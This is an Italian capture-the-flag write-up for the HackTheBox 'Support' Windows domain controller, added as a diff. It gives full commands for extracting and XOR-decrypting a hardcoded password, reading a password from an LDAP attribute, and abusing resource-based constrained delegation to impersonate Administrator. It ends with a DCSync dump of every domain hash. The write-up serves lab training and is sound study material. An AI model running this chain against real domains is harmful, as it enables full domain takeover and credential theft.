@@ -1,0 +1,215 @@
+# Writeup — Support (HackTheBox)
+
+OS: Windows Server 2022 (Active Directory)
+Difficoltà: Easy
+Data: 18 giugno 2026
+
+---
+
+## Sommario
+
+Macchina Active Directory. Si parte da una share SMB accessibile in anonimo che contiene un tool interno .NET. Dal binario si estrae una password cifrata e la relativa chiave, si decifra ottenendo le credenziali dell'account ldap. Da lì: enumerazione LDAP completa, recupero della password dell'account support nascosta in un campo info, shell WinRM, e privilege escalation finale tramite il diritto di scrittura sull'oggetto computer del DC (RBCD) che porta a impersonare Administrator e compromettere l'intero dominio.
+
+Catena: SMB anonimo → estrazione credenziali da binario .NET → ldap → password nel campo info LDAP → WinRM support → WRITE su DC$ → RBCD → S4U → Administrator.
+
+---
+
+## strumenti e metodologie aggiuntive
+
+durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.
+
+---
+
+## Premessa
+
+Questa box è classificata Easy ma la prima parte (estrazione e decifratura della password dal binario) ha richiesto diversi tentativi a vuoto prima di capire il meccanismo di cifratura. La parte di escalation invece è stata lineare una volta identificato il diritto di scrittura sul DC. Il writeup documenta anche i tentativi falliti perché sono la parte più utile, in particolare la lunga serie di vie morte tentate prima di trovare il vettore RBCD.
+
+---
+
+## Fase 1 — Ricognizione
+
+Port scan iniziale concentrato su SMB e poi enumerazione delle share:
+
+nmap -Pn -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users 10.129.20.89
+
+Host raggiungibile. Compare una share non standard: support-tools, accessibile in anonimo. Ambiente AD confermato. Dominio: support.htb, DC: dc.support.htb.
+
+Setup /etc/hosts e sincronizzazione clock (necessaria ad ogni respawn):
+
+sudo sh -c 'echo "10.129.X.X dc.support.htb support.htb DC" >> /etc/hosts'
+sudo ntpdate 10.129.X.X
+
+---
+
+## Fase 2 — Share anonima e analisi del binario
+
+Accesso anonimo alla share e download del contenuto:
+
+smbclient //10.129.20.89/support-tools -N
+mask ""
+recurse ON
+prompt OFF
+mget *
+
+File rilevanti: UserInfo.exe.zip, putty.exe, WiresharkPortable, ecc. L'unico interessante è UserInfo.exe.zip — un tool interno custom.
+
+Decompresso e analizzato. È un eseguibile .NET. Prima passata con strings per orientarsi:
+
+strings UserInfo.exe | grep -iE "password|ldap|key"
+
+Riferimenti a enc_password, LdapQuery, getPassword. Il binario interroga LDAP usando credenziali hardcoded e cifrate. Disassemblo con monodis per leggere i campi:
+
+monodis --output=userinfo.il UserInfo.exe
+
+Estratti i due valori chiave:
+
+enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = "armando"
+
+---
+
+## Fase 3 — Decifratura della password (con i fallimenti)
+
+Il meccanismo di cifratura non era ovvio dal nome. Diversi tentativi a vuoto prima di capire lo schema:
+
+### Tentativo 1 e 2 — cifrari simmetrici standard
+
+Provati AES-256 in modalità ECB e CBC usando "armando" come chiave. Output non ASCII, byte casuali. Schema sbagliato.
+
+### Tentativo 3 — RC4
+
+Provato RC4 con la stessa chiave. Anche qui output binario illeggibile.
+
+### Soluzione — XOR con chiave e operazione fissa
+
+Rileggendo il disassemblato il flusso era: base64 decode di enc_password, poi XOR di ogni byte con la chiave "armando" e con un valore costante (0xDF). Replicato in Python:
+
+enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
+key = b"armando"
+out = bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc)))
+
+Risultato: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz — la password dell'account ldap.
+
+---
+
+## Fase 4 — Enumerazione LDAP
+
+Con le credenziali di ldap, accesso confermato alla share e poi enumerazione LDAP completa:
+
+ldapsearch -x -H ldap://10.129.20.89 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=user)" sAMAccountName
+
+21 utenti enumerati (Administrator, Guest, krbtgt, ldap, support, smith.rosario, hernandez.stanley, e altri). Cerco password in campi non standard. Il campo description non contiene nulla, ma scansionando gli attributi dell'account support compare il campo info:
+
+ldapsearch -x -H ldap://10.129.20.89 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)" info
+
+Campo info: Ironside47pleasure40Watchful — la password dell'account support, lasciata in chiaro in un attributo dimenticato.
+
+---
+
+## Fase 5 — Shell WinRM come support
+
+support è membro di Remote Management Users, quindi WinRM è disponibile:
+
+evil-winrm -i 10.129.20.89 -u support -p 'Ironside47pleasure40Watchful'
+
+Shell ottenuta. User flag su support\Desktop.
+
+---
+
+## Fase 6 — Ricerca del vettore di escalation (con tutti i fallimenti)
+
+Questa è la fase che ha richiesto più tempo. support non è in nessun gruppo privilegiato (solo Domain Users e Shared Support Accounts), quindi ho provato una lunga serie di vettori, quasi tutti falliti:
+
+### Privilegi locali
+
+whoami /all mostrava solo SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege. SeMachineAccountPrivilege significa che support può creare account computer — annotato ma non ancora collegato al vettore finale.
+
+### winPEAS
+
+winPEAS64.exe segnalava un GenericAll su Administrator, che si è rivelato un falso positivo: la verifica con PowerView mostrava SecurityIdentifier S-1-5-18 (SYSTEM locale), non sfruttabile.
+
+### Tentativi di reset password Administrator (tutti falliti)
+
+- net user Administrator NuovaPass /domain → access denied
+- Set-DomainUserPassword via PowerView → access denied
+- rpcclient setuserinfo2 → NT_STATUS_ACCESS_DENIED
+
+### DCSync diretto (fallito)
+
+impacket-secretsdump come support → DRSR SessionError, ERROR_DS_DRA_BAD_DN. support non ha i diritti di replica.
+
+### Kerberoasting e AS-REP Roasting (entrambi vuoti)
+
+GetUserSPNs.py → No entries found, nessun SPN nel dominio. GetNPUsers.py → nessun utente con DONT_REQUIRE_PREAUTH. Entrambi i vettori chiusi.
+
+### GPO e SYSVOL (nessun permesso)
+
+Verificati i permessi sulle GPO: scrittura solo a Domain Admins, Enterprise Admins e SYSTEM. Test di scrittura su SYSVOL → UnauthorizedAccessException.
+
+---
+
+## Fase 7 — RBCD e accesso finale
+
+Il vettore corretto emerge enumerando i diritti di scrittura di support sugli oggetti AD con bloodyAD:
+
+bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' get writable
+
+Output rivelatore: support ha DACL: WRITE sull'oggetto CN=DC,OU=Domain Controllers (l'account computer del DC). Questo, combinato con SeMachineAccountPrivilege visto prima, permette un attacco Resource-Based Constrained Delegation completo.
+
+Passo 1 — creo un account computer controllato da me:
+
+bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer fakepc 'Pass123!'
+
+Passo 2 — configuro RBCD su DC$ delegando al mio fakepc (nota: il sAMAccountName richiede il $ finale, primo tentativo senza $ fallito con NoResultError):
+
+bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd 'DC$' 'fakepc$'
+
+Output: fakepc$ can now impersonate users on DC$ via S4U2Proxy.
+
+Passo 3 — S4U per ottenere un ticket di servizio come Administrator verso il DC:
+
+getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.230.181 'support.htb/fakepc$:Pass123!'
+
+Ticket salvato. Lo esporto e ottengo la shell. Qui un intoppo: wmiexec restituiva No route to host perché /etc/hosts conteneva una riga residua di un respawn precedente con un IP vecchio per dc.support.htb. Rimossa la riga obsoleta:
+
+sudo sed -i '/10.129.20.89/d' /etc/hosts
+export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+wmiexec.py -k -no-pass support.htb/Administrator@dc.support.htb
+
+Shell come Administrator ottenuta. Root flag su Administrator\Desktop.
+
+A conferma dell'impatto, DCSync completo dell'NTDS.DIT:
+
+secretsdump.py -k -no-pass support.htb/Administrator@dc.support.htb -just-dc
+
+Dump di tutti gli hash del dominio incluso krbtgt. Da notare: tutti gli utenti standard condividono lo stesso NT hash, segno di account creati in massa con la stessa password.
+
+---
+
+## Catena completa
+
+Share SMB anonima → UserInfo.exe (binario .NET)
+→ estrazione enc_password + key → decifratura XOR → credenziali ldap
+→ enumerazione LDAP → password support nel campo info
+→ WinRM come support
+→ bloodyAD: WRITE su DC$ (DACL)
+→ creazione account computer + RBCD su DC$
+→ S4U2Proxy → ticket Administrator
+→ wmiexec → Administrator → root
+→ DCSync NTDS.DIT (impatto sull'intero dominio)
+
+---
+
+## Lezioni apprese
+
+Quando una password è cifrata in un binario con una chiave hardcoded, non assumere subito un cifrario standard. Leggere il disassemblato e replicare l'esatta sequenza di operazioni è più veloce che provare alla cieca AES/RC4 con tutte le modalità.
+
+Le password lasciate in attributi LDAP non standard (info, description) sono un classico: vanno sempre enumerati tutti gli attributi di un account, non solo quelli ovvi.
+
+Il vettore di escalation non era nei privilegi locali né nei gruppi di appartenenza, ma in un singolo diritto di scrittura su un oggetto AD. Appena un account ha SeMachineAccountPrivilege, controllare subito con bloodyAD su quali oggetti ha WRITE: se c'è scrittura su un account computer del DC, l'RBCD è quasi immediato. Avrei risparmiato ore se avessi enumerato i diritti DACL prima di tentare reset password e roasting.
+
+---
+
+## Tool utilizzati
+
+nmap, smbclient, monodis, strings, Python, ldapsearch, evil-winrm, bloodyAD, getST.py, wmiexec.py, secretsdump.py, winPEAS, PowerView
